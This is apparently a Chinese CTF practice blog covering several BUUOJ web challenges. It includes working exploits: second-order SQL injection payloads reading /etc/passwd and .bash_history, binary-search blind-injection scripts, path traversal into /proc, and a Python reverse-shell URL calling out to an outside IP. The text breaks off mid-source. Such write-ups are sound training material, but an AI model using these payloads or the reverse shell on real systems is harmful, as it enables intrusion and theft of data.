alt="image-20220328203639569"></p><p>查看源代码，发现了个有趣的路径</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204251360.png" alt="image-20220328204251360"></p><p>继续用burp抓包打开</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204549649.png" alt="image-20220328204549649"></p><p>这两个都点击后，没有效果</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204655545.png" alt="image-20220328204655545"></p><p>查看下源代码，发现一个可疑路径</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204718322.png" alt="image-20220328204718322"></p><p>进入后，界面如下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204815035.png" alt="image-20220328204815035"></p><p>点击按钮，又会die</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204844208.png" alt="image-20220328204844208"></p><p>继续查看源代码，无限套娃呗</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204931097.png" alt="image-20220328204931097"></p><p>进去</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205009037.png" alt="image-20220328205009037"></p><p>点击continue<br><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205120224.png" alt="image-20220328205120224"></p><p>要选择一个正确的数字，但是太多了吧，先看看源代码吧，发现如下js代码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205425890.png" alt="image-20220328205425890"></p><p>嘿嘿，不用一个个试了，直接到open目录</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205558332.png" alt="image-20220328205558332"></p><p>继续查看源代码，发现fight目录</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205711090.png" alt="image-20220328205711090"></p><p>进入，一个可怕的外星人</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205745540.png" alt="image-20220328205745540"></p><p>继续查看源代码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205854907.png" alt="image-20220328205854907"></p><p>发现flag的顺序被打算，想要反解函数不现实，尝试全排列</p><pre><code>itertools.permutations()：就是返回可迭代对象的所有数学全排列方式,它以任意迭代作为参数，并始终返回生成元组的迭代器。它没有(也不应该)特殊的字符串。要获得字符串列表，您可以自己加入元组： list(map(&quot;&quot;.join, itertools.permutations(&#39;1234&#39;)))</code></pre><pre><code class="python">from itertools import permutationsflag = [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]item = permutations(flag)for i in item:    #print (i)    k=&quot;&quot;.join(i)    #print(k)    if k.startswith(&#39;pctf&#123;hey_boys&#39;) and k[-1]==&#39;&#125;&#39;:        print(k)</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328215044738.png" alt="image-20220328215044738"></p><p>找到可能的flag，尝试即可</p><p>最终flag为</p><pre><code>pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</code></pre><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>需要登录才能发帖</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231641292.png" alt="image-20220328231641292"></p><p>.给了账号和密码前几位，直接burp爆破</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231742892.png" alt="image-20220328231742892"></p><p>成功爆破出密码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231810749.png" alt="image-20220328231810749"></p><p>没发现什么有用的，用dirsearch扫一下目录，注意，由于buu很容易崩溃，要降低速度</p><pre><code>python dirsearch.py -u http://bc06d5bc-c6b1-49d6-b004-e2f130e630ae.node4.buuoj.cn:81/ -e php -t 2 -s 0.2 -o C:\User\Sakura\Desktop\2.txt</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328232440677.png" alt="image-20220328232440677"></p><p>发现git泄露,使用githack扒出源码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328232710003.png" alt="image-20220328232710003"></p><pre><code class="php">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] != &#39;yes&#39;)&#123;    header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    break;case &#39;comment&#39;:    break;default:    header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: ./index.php&quot;);&#125;?&gt;</code></pre><p>但是这段代码明显不完整</p><p>使用(这里推荐使用linux，我用windows出现了错误)</p><pre><code>git log --all</code></pre><p>查一下之前提交的版本</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329000637723.png" alt="image-20220329000637723"></p><p>恢复到初始版本</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329000916068.png" alt="image-20220329000916068"></p><p>成功得到完整源码</p><pre><code class="php">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] != &#39;yes&#39;)&#123;    header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    $category = addslashes($_POST[&#39;category&#39;]);    $title = addslashes($_POST[&#39;title&#39;]);    $content = addslashes($_POST[&#39;content&#39;]);    $sql = &quot;insert into board            set category = &#39;$category&#39;,                title = &#39;$title&#39;,                content = &#39;$content&#39;&quot;;    $result = mysql_query($sql);    header(&quot;Location: ./index.php&quot;);    break;case &#39;comment&#39;:    $bo_id = addslashes($_POST[&#39;bo_id&#39;]);    $sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;;    $result = mysql_query($sql);    $num = mysql_num_rows($result);    if($num&gt;0)&#123;    $category = mysql_fetch_array($result)[&#39;category&#39;];    $content = addslashes($_POST[&#39;content&#39;]);    $sql = &quot;insert into comment            set category = &#39;$category&#39;,                content = &#39;$content&#39;,                bo_id = &#39;$bo_id&#39;&quot;;    $result = mysql_query($sql);    &#125;    header(&quot;Location: ./comment.php?id=$bo_id&quot;);    break;default:    header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: ./index.php&quot;);&#125;?&gt;</code></pre><p>开始审计代码</p><p>先介绍下addslashes函数</p><pre><code>addslashes() 函数在指定的预定义字符前添加反斜杠。这些字符是单引号（&#39;）、双引号（&quot;）、反斜线（\）与NUL（NULL字符）。</code></pre><p>逻辑其实很清晰</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329003323533.png" alt="image-20220329003323533"></p><p>当我们访问一个页面，取出这个页面中category的值然后接受content的值，插入到该页面。但是问题就出在，此代码只对用户输入的值做了转义，而绝对信任从服务器中取出的值，这就导致了二次注入。所以我们要想办法闭合sql语句，使其可以执行我们恶意的sql语句。</p><p>所以我们要对发帖处的categories做特殊输入</p><pre><code>0&#39;,content = database(), /*</code></pre><p>然后在留言处输入</p><pre><code>*/#</code></pre><p>这时候的sql语句就变为</p><pre><code>$sql = &quot;insert into comment        set category = &#39;0&#39;,content = &#39;database()&#39;/*&#39;,        content = &#39;*/#&#39;,        bo_id = &#39;$bo_id&#39;&quot;;</code></pre><p>简化后</p><pre><code>$sql = &quot;insert into comment set category = &#39;0&#39;,content = &#39;database()&#39;,bo_id = &#39;$bo_id&#39;&quot;;</code></pre><p>这样通过在category构造，可以把content替换成我们想要的语句</p><p>我们来看一下执行效果</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005247027.png" alt="image-20220329005247027"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005310132.png" alt="image-20220329005310132"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005321316.png" alt="image-20220329005321316"></p><p>成功爆出了数据库</p><p>查看一下权限</p><pre><code>0&#39;,content = user(), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005602357.png" alt="image-20220329005602357"></p><p>最高权限，可以尝试load_file()读取文件</p><pre><code>0&#39;,content = load_file(&#39;/etc/passwd&#39;), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005942676.png" alt="image-20220329005942676"></p><p>我们发现www用户(一般和网站操作相关的用户，由中间件创建)在/home/www目录,读取这下面的.bash_history文件</p><pre><code>每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件，保存了当前用户使用过的历史命令，方便查找。</code></pre><pre><code>0&#39;,content = load_file(&#39;/home/www/.bash_history&#39;), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329010244317.png" alt="image-20220329010244317"></p><p>我们可以看到它解压了一个html.zip，删除html.zip,然后整个文件夹复制到/var/www/html里，然后删除.DS_Store</p><pre><code>.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。通过.DS_Store可以知道这个目录里面所有文件的清单。</code></pre><p>它还有一份存在于在/tmp//html/目录中，构造sql语句进行读取</p><pre><code>0&#39;,content = load_file(&#39;/tmp/html/.DS_Store&#39;), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329010811271.png" alt="image-20220329010811271"></p><p>这里文件太多，无法完全显示，进行十六进制转换</p><pre><code>0&#39;,content = hex(load_file(&#39;/tmp/html/.DS_Store&#39;)), /*</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329011204300.png" alt="image-20220329011204300"></p><p>解码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013046184.png" alt="image-20220329013046184"></p><p>发现可疑文件</p><pre><code>flag_8946e1ff1ee3e40f.php</code></pre><p>构造sql语句进行读取</p><pre><code>0&#39;,content = load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;), /*</code></pre><p>这里有个坑，/tmp/html/flag_8946e1ff1ee3e40f.php的flag是假flag，还是要当当前运行的网站目录下读取</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013441800.png" alt="image-20220329013441800"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013451988.png" alt="image-20220329013451988"></p><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>考察sql注入</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329161851618.png" alt="image-20220329161851618"></p><p>测试一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329161953080.png" alt="image-20220329161953080"></p><p>有waf，fuzz一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162032033.png" alt="image-20220329162032033"></p><p>发现很多关键词被过滤了</p><p>考虑盲注，测试一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162428599.png" alt="image-20220329162428599"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162354207.png" alt="image-20220329162354207"></p><p>确认了盲注的存在</p><pre><code>为什么加上||1=1后，值会变为Nu1L后呢，这里牵扯到运算顺序，这是我之前百思不得其解的一点，后门才想起来</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162630562.png" alt="image-20220329162630562"></p><p>我们可以看到比较运算的优先级是高于or的，所以会先判断右边的值是否为真，如果为真就不会再看左边了。</p><p>总之我们确定了要从盲注入手，但还有一个关键点，那就是information这个表被禁用，我们需要从其他表中获取我们需要的内容。</p><p><strong>1.利用mysql5.7新增的sys.schema_auto_increment_columns</strong></p><pre><code> 这是sys数据库下的一个视图，基础数据来自与information_schema,他的作用是对表的自增ID进行监控，也就是说，如果某张表存在自增ID，就可以通过该视图来获取其表名和所在数据库名以下为该视图的所有列</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141522482.png" alt="img"></p><p><strong>2.sys.schema_table_statistics_with_buffer</strong></p><pre><code> 这是sys数据库下的视图，里面存储着所有数据库所有表的统计信息  与它表结构相似的视图还有  sys.x$schema_table_statistics_with_buffer  sys.x$schema_table_statistics  sys.x$ps_schema_table_statistics_io以下为该视图的常用列（全部列有很多很多)</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141702221.png" alt="img"></p><p><strong>3.mysql默认存储引擎innoDB携带的表</strong></p><pre><code>  mysql.innodb_table_stats  mysql.innodb_index_stats  两表均有database_name和table_name字段，可以利用</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141811114.png" alt="img"></p><p>盲注需要用二进制跑才能提高效率，贴上写的盲注脚本，我太菜了写一个要半天时间</p><pre><code class="python">import timeimport requestsurl = &quot;http://f7bc77b0-cab8-4b62-a524-0b593aa80d8b.node4.buuoj.cn:81/index.php&quot;i = 0result = &#39;&#39;for i in range(1,2000):    min = 32    max = 128    mid = (min + max) // 2    while min &lt; max:        payload = &quot;1^(ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema)=database()),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i, mid)        print(payload)        data = &#123;            &quot;id&quot;: payload        &#125;        res = requests.post(url, data)        if &quot;Error&quot; in res.text:            min = mid + 1        else:            max = mid        mid = (min + max) // 2    result += chr(int(mid))    print(result)    time.sleep(0.5)</code></pre><p>最好的办法是背下来模板，这样真正的比赛时才能较快写题。</p><p>最终得到两个表</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329180202611.png" alt="image-20220329180202611"></p><p>接下来就要从表中拿flag</p><p>下面要用到<strong>无列名注入</strong></p><p>为什么要采用这个注入呢，是因为sys.schema_table_statistics_with_buffer中只有表的信息，并没有列的信息，因此无法使用常规的方法。</p><p>关于无列名注入，首先我们来看一个例子</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329211549667.png" alt="image-20220329211549667"></p><p>这代表字符串的大小于长短无关，而与首字母(如果首字母相同则继续向下比大小)的ascii有关</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329211742422.png" alt="image-20220329211742422"></p><p>由这个我们就能构造出payload</p><p>先来判断下字段</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329213941106.png" alt="image-20220329213941106"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329213956411.png" alt="image-20220329213956411"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329214035443.png" alt="image-20220329214035443"></p><p>由此可判断字段为两个</p><p>payload</p><pre><code>id=1||((select 1,&#123;0&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</code></pre><p>代码:</p><p>暴力</p><pre><code class="python">import timeimport requestsurl = &quot;http://f7bc77b0-cab8-4b62-a524-0b593aa80d8b.node4.buuoj.cn:81/index.php&quot;value = &#39;&#39;def get_flag(char,value):    return value+charfor m in range(1,2000):    for i in range(32,128):        payload = &#39;2||((select 1,&quot;&#123;&#125;&quot;))&gt;(select * from f1ag_1s_h3r3_hhhhh)&#39;.format(get_flag(chr(i), value))        print(payload)        data = &#123;            &quot;id&quot;: payload        &#125;        res = requests.post(url, data)        time.sleep(0.5)        if &quot;Nu1L&quot; in res.text:            value += chr(i-1)            print(value)            break</code></pre><h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p><strong>非预期解</strong></p><p>这题做的很奇妙，，，直接非预期解了</p><pre><code>e55bfc7a-1b58-4018-8545-2c34946638fc.node4.buuoj.cn:81/page?url=../../../../flag</code></pre><p>得到一个图片，拖到010editor，flag直接出现</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330004918193.png" alt="image-20220330004918193"></p><p><strong>预期解</strong></p><p>还是学习下正规思路吧</p><p>首先应该读取下进程信息</p><pre><code>在/proc 文件系统中，每一个进程都有一个相应的文件  。下面是/proc 目录下的一些重要文件  ：/proc/pid/cmdline  包含了用于开始进程的命令  ；/proc/pid/cwd 包含了当前进程工作目录的一个链接  ；/proc/pid/environ  包含了可用进程环境变量的列表  ；/proc/pid/exe  包含了正在进程中运行的程序链接；/proc/pid/fd/  这个目录包含了进程打开的每一个文件的链接；/proc/pid/mem  包含了进程在内存中的内容；/proc/pid/stat 包含了进程的状态信息；/proc/pid/statm  包含了进程的内存使用信息。 </code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330010223445.png" alt="image-20220330010223445"></p><p>可以看到刚开始执行了</p><pre><code>python2 app.py</code></pre><p>我们来读取下app.py的源码</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330010349857.png" alt="image-20220330010349857"></p><pre><code class="python">from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = &quot;/tmp/secret.txt&quot;f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route(&#39;/&#39;)def index():    return render_template(&#39;search.html&#39;)@app.route(&#39;/page&#39;)def page():    url = request.args.get(&quot;url&quot;)    try:        if not url.lower().startswith(&quot;file&quot;):            res = urllib.urlopen(url)            value = res.read()            response = Response(value, mimetype=&#39;application/octet-stream&#39;)            response.headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=beautiful.jpg&#39;            return response        else:            value = &quot;HACK ERROR!&quot;    except:        value = &quot;SOMETHING WRONG!&quot;    return render_template(&#39;search.html&#39;, res=value)@app.route(&#39;/no_one_know_the_manager&#39;)def manager():    key = request.args.get(&quot;key&quot;)    print(SECRET_KEY)    if key == SECRET_KEY:        shell = request.args.get(&quot;shell&quot;)        os.system(shell)        res = &quot;ok&quot;    else:        res = &quot;Wrong Key!&quot;    return resif __name__ == &#39;__main__&#39;:    app.run(host=&#39;0.0.0.0&#39;, port=8080)</code></pre><p>linux里如果没有关闭文件会放在内存里，就算你remove掉了<strong>在/proc/[pid]/fd下还是会保存</strong></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330012552404.png" alt="image-20220330012552404"></p><p>找到了密钥</p><pre><code>8KI7ZjeLAu178g1JBR9DcCwNsnWdY64XmDWv/PH5qe0=</code></pre><p>结果是无回显rce</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330012910567.png" alt="image-20220330012910567"></p><p>使用反弹shell</p><pre><code>http://e55bfc7a-1b58-4018-8545-2c34946638fc.node4.buuoj.cn:81/no_one_know_the_manager?key=8KI7ZjeLAu178g1JBR9DcCwNsnWdY64XmDWv/PH5qe0=&amp;shell=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22108.166.201.16%22,3333));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330014147414.png" alt="image-20220330014147414"></p><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>这题很简单，进去后我们只有50元但是有一个100元的曲奇</p><p>猜测购买这个曲奇获得flag</p><p>点击购买并抓包</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164344642.png" alt="image-20220330164344642"></p><p>seesion很像base64加密</p><p>解密一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164431797.png" alt="image-20220330164431797"></p><p>修改下money然后再base64加密</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164507027.png" alt="image-20220330164507027"></p><p>购买100元的曲奇，替换原有的cookie</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164535408.png" alt="image-20220330164535408"></p><p>成功获得flag</p><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>点击查看文件</p><pre><code>http://2895a638-1834-4f93-8e10-962056e63a83.node4.buuoj.cn:81/file.php?file=</code></pre><p>观察url，很可能是文件包含，读取下各个文件源码</p><p>index.php</p><pre><code class="php">&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;base.php&#39;;?&gt; </code></pre><p>base.php</p><pre><code class="php">&lt;?php     session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt;     &lt;meta charset=&quot;utf-8&quot;&gt;     &lt;title&gt;web3&lt;/title&gt;     &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt;     &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;     &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt;     &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt;         &lt;div class=&quot;container-fluid&quot;&gt;         &lt;div class=&quot;navbar-header&quot;&gt;             &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;首页&lt;/a&gt;         &lt;/div&gt;             &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt;                 &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;查看文件&lt;/a&gt;&lt;/li&gt;                 &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;上传文件&lt;/a&gt;&lt;/li&gt;             &lt;/ul&gt;             &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt;                 &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;/a&gt;&lt;/li&gt;             &lt;/ul&gt;         &lt;/div&gt;     &lt;/nav&gt; &lt;/body&gt; &lt;/html&gt; &lt;!--flag is in f1ag.php--&gt;</code></pre><p>file.php</p><pre><code class="php">首页    查看文件    上传文件    10.244.80.46&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); $file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123;     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123;     $show-&gt;source = $file;     $show-&gt;_show(); &#125; else if (!empty($file))&#123;     die(&#39;file doesn\&#39;t exists.&#39;); &#125; ?&gt;  </code></pre><p>upload_file.php</p><pre><code class="php">222.90.67.205&lt;?php include &#39;function.php&#39;; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest=&quot;utf-8&quot;&gt; &lt;title&gt;文件上传&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div align = &quot;center&quot;&gt;         &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; &lt;/div&gt; &lt;style&gt;     p&#123; margin:0 auto&#125; &lt;/style&gt; &lt;div&gt; &lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;     &lt;label for=&quot;file&quot;&gt;文件名:&lt;/label&gt;     &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;     &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; &lt;/div&gt; &lt;/script&gt; &lt;/body&gt; 